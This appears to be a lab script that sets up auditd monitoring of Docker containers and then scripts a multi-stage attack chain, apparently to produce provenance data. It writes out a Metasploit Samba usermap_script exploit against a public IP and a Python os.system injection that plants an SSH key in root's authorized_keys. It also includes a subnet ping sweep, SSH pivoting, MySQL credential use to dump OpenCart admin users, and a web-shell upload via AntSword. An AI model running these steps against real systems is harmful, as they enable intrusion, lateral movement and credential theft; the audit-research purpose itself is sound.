# 准备工作：auditd设置规则
# 后面如果有需要，可以监控php，并且修改此处的pid和数据卷
# mysql
sudo auditctl -a always,exit -F arch=b64 -F pid=23867 -S all -k mysql
sudo auditctl -w /var/lib/docker/overlay2/e5523415c3582c228eaf2dc910a265b15b1ffe59ad7cb2af0e5ff8b2ec597031/merged -p wxra -k mysql
# provdb
sudo auditctl -a always,exit -F arch=b64 -F pid=25107 -S all -k provdb
sudo auditctl -w /var/lib/docker/overlay2/31f29aa847f2cf93e021fa8ebdd26287291ebd45eaf285138af86f894bfd64ac/merged -p wxra -k provdb
# provdb-frontend
sudo auditctl -a always,exit -F arch=b64 -F pid=24918 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=24923 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=24924 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=24925 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=24926 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=24927 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=25261 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=25264 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=25265 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=25266 -S all -k provdbfrontend
sudo auditctl -a always,exit -F arch=b64 -F pid=25267 -S all -k provdbfrontend
sudo auditctl -w /var/lib/docker/overlay2/ae0ddff012224ab55b13418c198abe4440036d0543e2dcdf807c094595259ea9/merged -p wxra -k provdbfrontend
# opencart
sudo auditctl -a always,exit -F arch=b64 -F pid=24151 -S all -k opencart
sudo auditctl -a always,exit -F arch=b64 -F pid=24153 -S all -k opencart
sudo auditctl -a always,exit -F arch=b64 -F pid=24154 -S all -k opencart
sudo auditctl -w /var/lib/docker/overlay2/3b5e4a7316bcdbea8dcac751f64a140161267324b629873d319135e07980c472/merged -p wxra -k opencart
# attacker
sudo auditctl -a always,exit -F arch=b64 -F pid=30079 -S all -k attacker
sudo auditctl -w /var/lib/docker/overlay2/99b902571b0b44a5ed4426d07eeca3d9d23cdb1798d2f776485d6fbb09fc44f2/merged -p wxra -k attacker

# 可能需要手动开启provdb（结点2）的ssh，这一步后面可以再改进，目前可以先手动开启
docker run -it --network host metasploitframework/metasploit-framework:latest
use exploit/multi/samba/usermap_script
set rhosts 82.157.8.106
exploit
# 结点1，provdb-frontend
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
cat /root/.ssh/id_rsa.pub # 然后把这里的公钥放到去计算里
# 去计算输入框的内容（举例）
os.system("mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAvVI6FDUP9ZypYJk4ja8WbAbhUcz7RL67TcGwOsIXz5ivIKDwDLbVi25ZtJXjA7hErS+kakJZpYuHCiuRCRExr9VP8joIhOH8dtZ1ZUzY9FZaSbgboPQQKGwyGeYvqJKCur1P4tjZC0I2lyCx4e80q4RHQEmt2JyVvfTtRizSML84tyYX4x3H2rdv2vNgdEk3RaPqMosIc9iZ3ipHrjFF2wqd9wMQrstMXm2EUqdy900nh/euMmLDq6ZW1Hq+9kWU/ur2D1Mi48xahfQ97bKKOXjrAYRKIB9ENyBm63hJiHZzLFxjvJMP0ao+TfShMN7KoxvkojF2K8AUCZu5A6aFE5GwC+WBIn6nernJT7bt9rBPdOEGmSYz8AUspU8CmbuYOolETXCji1Zhp+f5wRVMZYmLSQaagoVWGSOYv4qr8TDkzf0Rf6HOkU3YqvcY+Tesh6TDDq8E08z/WnAPBDwUA29c+sbV9GkM5HBvHNK5k4Lg8z9w4X5E9pmb/pmYZtzUqcWz4qGbevTIlk2zUzAfkKFolay4iI6EBYUY7RcARvWbmmsHSuBTXmHQmNaGoh3CmuZ6n4Zcmoyf6X2xpeqtAzuMgmsvZWwytf/dIhqVfaB7VqQ1zunHjKzURziKgGQD/FrpeYMgF1EUiRcjRyTbaV1hbmV79EFjvfZF5CgjenM= your_email@example.com'>>/root/.ssh/authorized_keys")
# 扫描172.23.0.*网段
# 设置1s超时
for k in $( seq 1 32);do ping -c 1 -W 1 172.23.0."$k"|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
ssh root@172.23.0.11 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
ssh root@172.23.0.12 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
# 结点2，provdb
# 发现了数据库账号密码
cat /app/src/user/db.conf
# 发现了另一个数据库
mysql -uroot -h172.23.0.14 -pCyberShell2021 --execute 'show databases;'
mysql -uroot -h172.23.0.14 -pCyberShell2021 --execute 'use opencart; show tables;'
mysql -uroot -h172.23.0.14 -pCyberShell2021 --execute 'use opencart; select * from oc_user;'
# 发现账号密码，登录opencart管理员界面
# 上传 1.php
# 进行蚁剑连接
# 删除文件
